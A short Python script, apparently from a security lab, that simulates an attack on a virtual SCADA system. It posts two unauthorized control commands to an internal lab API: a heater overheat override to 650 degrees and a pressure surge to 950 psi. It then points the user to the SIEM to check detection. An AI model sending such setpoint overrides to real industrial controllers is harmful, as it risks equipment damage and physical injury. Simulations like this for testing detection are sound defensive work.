#!/usr/bin/env python3
"""
OT / SCADA Modbus PLC Attack Simulation
Attempts unauthorized register manipulation against virtual PLC and SCADA gateway.
"""

import time
import requests
from colorama import init, Fore, Style

init(autoreset=True)

SCADA_CONTROL_URL = "http://backend:5000/api/v1/scada/control"
GATEWAY_URL = "http://scada-gateway:5002"

def run_ot_attack():
    print(f"{Fore.CYAN}[*] Starting Industrial OT / SCADA Modbus Register Attack Simulation...{Style.RESET_ALL}")
    
    # 1. Test SCADA control override
    print(f"{Fore.YELLOW}[*] Step 1: Attempting unauthorized PLC emergency valve override...{Style.RESET_ALL}")
    payload = {
        "machine_id": "r1_heater",
        "action": "EMERGENCY_OVERHEAT_OVERRIDE",
        "target_temperature": 650.0,
        "operator": "attacker_exploit"
    }
    
    try:
        res = requests.post(SCADA_CONTROL_URL, json=payload, timeout=5)
        print(f"{Fore.RED}[+] Sent PLC override payload -> Response: {res.status_code} {res.text[:100]}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Control API probe sent: {e}{Style.RESET_ALL}")
        
    time.sleep(1)
    
    # 2. Test Pressure threshold violation
    print(f"{Fore.YELLOW}[*] Step 2: Attempting Refinery 2 Flow surge manipulation...{Style.RESET_ALL}")
    surge_payload = {
        "machine_id": "r2_flow",
        "action": "SET_PRESSURE_MAX",
        "target_psi": 950.0,
        "operator": "unauthorized_modbus_client"
    }
    try:
        res = requests.post(SCADA_CONTROL_URL, json=surge_payload, timeout=5)
        print(f"{Fore.RED}[+] Sent flow surge command -> Response: {res.status_code} {res.text[:100]}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Surge probe sent: {e}{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}[✓] OT / SCADA attack simulation concluded. Check SIEM & SCADA Gauges!{Style.RESET_ALL}")

if __name__ == "__main__":
    run_ot_attack()
